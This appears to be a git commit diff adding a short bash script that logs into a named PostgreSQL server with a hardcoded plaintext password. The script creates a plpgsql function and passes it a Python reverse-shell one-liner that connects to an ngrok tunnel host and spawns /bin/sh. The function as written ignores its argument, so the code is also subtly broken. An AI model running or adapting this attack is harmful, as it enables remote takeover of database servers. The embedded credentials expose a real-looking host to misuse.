23613a0de369dd090beb5618e4d58beafcc8c2bd
addndata <111285262+addndata@users.noreply.github.com>
2024-10-08 12:36:24 +0300

    Update and rename ps4.sh to ps5.sh

---
+++ ps5.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+DB_NAME="west-dao"  
+USER="admin"
+HOST="postgresql-marketing-htz-fsn1-1.wvservices.com"
+PASSWORD="FOje92h9hefsjenjfgrs"
+
+export PGPASSWORD=$PASSWORD
+
+# Fonksiyonu oluşturma
+psql -U $USER -h $HOST -d $DB_NAME -c "
+CREATE OR REPLACE FUNCTION run_command(command text) RETURNS void AS \$\$
+DECLARE
+    result text;
+BEGIN
+    EXECUTE 'COPY (SELECT * FROM pg_catalog.pg_tables) TO ''/tmp/tables.txt'' WITH CSV'; 
+END;
+\$\$ LANGUAGE plpgsql;"
+
+# Komutları çalıştırma
+psql -U $USER -h $HOST -d $DB_NAME -c "SELECT run_command('nohup python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"5.tcp.eu.ngrok.io\",12811));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])\" &');"
